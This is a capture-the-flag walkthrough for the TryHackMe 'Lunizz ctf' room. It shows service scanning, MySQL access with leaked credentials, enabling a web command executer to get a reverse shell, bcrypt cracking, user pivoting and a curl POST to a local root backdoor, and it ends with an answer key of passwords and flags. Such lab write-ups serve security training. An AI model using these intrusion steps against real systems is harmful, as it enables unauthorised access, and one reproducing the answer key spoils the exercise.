NAME:Lunizz ctf  
ROOM:https://tryhackme.com/room/lunizzctfnd  
OS:Linux  

----------------------------------------------------------------------------------------------
start by exporting the ip  

```
export IP='10.10.239.98'
```  

perform a nmap scan against the machine to find the running services  

```
nmap -sC -sV $IP
```  

# Nmap result:  

```Nmap scan report for 10.10.239.98
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-02-11T23:12:30
|_Not valid after:  2031-02-09T23:12:30
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: SupportsTransactions, Support41Auth, Speaks41ProtocolOld, LongPassword, FoundRows, LongColumnFlag, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: }\x15U4A\x0Bo(U\x1FoQx\x1BM\x1D<,Dr
|_  Auth Plugin Name: mysql_native_password
4444/tcp open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==
|   SSLSessionReq: 
|     Can you decode this for me?
|_    cmFuZG9tcGFzc3dvcmQ=
5000/tcp open  upnp?
| fingerprint-strings: 
|   NULL, X11Probe: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4444-TCP:V=7.94%I=7%D=10/24%Time=6537FA44%P=x86_64-pc-linux-gnu%r(N
SF:ULL,41,"Can\x20you\x20decode\x20this\x20for\x20me\?\nZXh0cmVtZXNlY3VyZX
SF:Jvb3RwYXNzd29yZA==\n")%r(GetRequest,4F,"Can\x20you\x20decode\x20this\x2
SF:0for\x20me\?\nZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==\nWrong\x20Password")
SF:%r(SSLSessionReq,31,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncmFuZ
SF:G9tcGFzc3dvcmQ=\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.94%I=7%D=10/24%Time=6537FA3E%P=x86_64-pc-linux-gnu%r(N
SF:ULL,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from
SF:\x20/usr/local/ssl/openssl\.cnf")%r(X11Probe,46,"OpenSSH\x205\.1\nUnabl
SF:e\x20to\x20load\x20config\x20info\x20from\x20/usr/local/ssl/openssl\.cn
SF:f");
```  

------------------------------------------------------------------------------------------------------------  

# Open Ports: 

80  (http)  Apache httpd 2.4.29 ((Ubuntu))  
3306  (mysql)   MySQL 5.7.33-0ubuntu0.18.04.1  
4444  (krb524)  
5000  (upnp)  

---------------------------------------------------------------------------------------------------------------

# Enumerating Services:  

## PORT 3306 (checking for Anonymous login)  

```
mysql -h $IP -u anonymous -p
```  

It don't have anonymous login  

## PORT 4444  

```
nc -nv $IP 4444
```  

![rabbithole](https://github.com/Debang5hu/ctf-writeups/assets/114200360/7979d32f-9f9b-46d0-af8d-645c43746768)  

It's a RABBIT HOLE  

## PORT 5000  

```
nc -nv $IP 5000
```  

it says 'Unable to load config info from /usr/local/ssl/openssl.cnf'  

## PORT 80  

Opening the website shows the default apache page  

checking common dir/files (/robots.txt,/.DS_STORE,/.svn) but it don't have thoese dir/files

Next,kicking off gobuster for directory fuzzing  

```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x txt,zip,html,bak
```  
Interesting Directories:  

/instructions.txt  
/hidden  
/whatever  

explore the directories  

## /instructions.txt  

![instructions](https://github.com/Debang5hu/ctf-writeups/assets/114200360/2465a810-0def-45a6-bece-ae60505d75a6)  


## /hidden   

![hidden](https://github.com/Debang5hu/ctf-writeups/assets/114200360/7eb01454-f824-4c2d-a30f-378042acb63e)  

## /whatever  

![whatever](https://github.com/Debang5hu/ctf-writeups/assets/114200360/41a15e42-2337-497e-a555-d928fd793bd4)  


----------------------------------------------------------------------------------------------------------------
From the txt file we got the credentials for mysql  

without further delay log into mysql using the credentials  

```
mysql -h 10.10.239.98 -u runcheck -p
```  

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+
```

```
use runornot;
```  

```
 show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
```  

```
select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
```  

Got nothing interesting  

--------------------------------------------------------------------------------------------------
Found the '/whatever' dir interesting cause 'Command Executer Mode :0','Command Executer' and one input field was there  

but nothing got executed!  

next thought of changing the value of run column of table runcheck (got in mysql from 0 to 1)    

```
update runcheck set run=1 where run=0;
```  

after changing it I refresh the /whatever page and got the 'Command Executer Mode' set to 1  
then I tried to execute command and it got executed  

Then used python's reverse-shell oneliner to get the reverse shell  

reverse-shell cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  


And BOOM we are in...   

![iamin](https://github.com/Debang5hu/ctf-writeups/assets/114200360/471db536-922e-4345-9fba-5b1b13ad8d0a)  


Now start enumerating:  

lets see whether it have some active connections or not  

```
netstat -tunlp
```

![enumerate](https://github.com/Debang5hu/ctf-writeups/assets/114200360/e3238e89-9331-42f5-9ea6-90e0444ea2d6)  


we found that something was running in the localhost  

```
curl http://127.0.0.1:8080
```  

make a curl request to see what is running  

![curlreq](https://github.com/Debang5hu/ctf-writeups/assets/114200360/c7bb190d-1d86-4545-8801-4b952942d56c)  

we found something interesting but nothing got executed  

Next,Navigating through the file system we found that 'proct' is the only directory owned by the user 'adam'  
so let's get into it  

![proct](https://github.com/Debang5hu/ctf-writeups/assets/114200360/c727fc76-6aa6-4b98-b3b8-bd2c77e3df8c)  


we found another directory just get into it,then we found a python script,that basically decrypts some text using  
*bcrypt* algorithm  

I thought of using the plaintext as the password of 'Adam' user but it's not the correct one,so thought of writting  
my own python script(passcracker.py) to get the password as the hash and salt was provided.  

check this link: https://en.wikipedia.org/wiki/Bcrypt  to better understand the algorithm  

Now,after getting the password use it to switch to adam user(horizontal privilege escalation)  

Even this user do not have sudo permissions  

Navigate to /home/adam directory  

we found a binary file and while executing it we got a shell as mason but it looks like a rabbit hole to me  

next,finding nothing useful, I got into the 'Desktop' directory,then '.archive' directory  

Found an interesting txt file 'to_my_best_friend_adam.txt'  

open the link and read the file to get the clue of the password of the user 'mason'  

--------------------------------------------------------------------------------------------------------------------  
Next get into Mason user with the password(all small letters and no space)  

We can get the user.txt from the mason's home directory  

Next,remenber we got something running on the localhost which says that it's a backdoor to root(Mason's)  


Use Curl to send a POST request to the local server  

```
curl 'http://locacurl 'http://localhost:8080' -X POST -d 'password=********lights&cmdtype=lsla'
```  
It returned the files of the root directory  


![rootbackdoor](https://github.com/Debang5hu/ctf-writeups/assets/114200360/46750593-0300-4a0f-8a46-04071aa74afc)  

Next,what if we use 'passwd' as cmdtype  

It says that Root's password is changed to mason's password  

---------------------------------------------------------------------------------------------------------------------
Now we try to be root (su root) with mason's password  

and boom we are ROOT!  

cat the  /root/r00t.txt to get the final flag!  

![root](https://github.com/Debang5hu/ctf-writeups/assets/114200360/573e1b72-6ec9-43ee-bcaa-2568a24a6d5e)  

------------------------------  
# ANSWER:  
--------  

### What is the default password for mysql -->  'CTF_script_cave_changeme'  
### I can't run commands, there must be a mysql column that controls command executer -->  'run'  
### a folder shouldn't be...  -->  'proct'  
### hi adam, do you remember our place?  --> 'northern lights'  
### user.txt  -->  'thm{23cd53cbb37a37a74d4425b703d91883}'  
### root.txt  -->  'thm{ad23b9c63602960371b50c7a697265db}'  














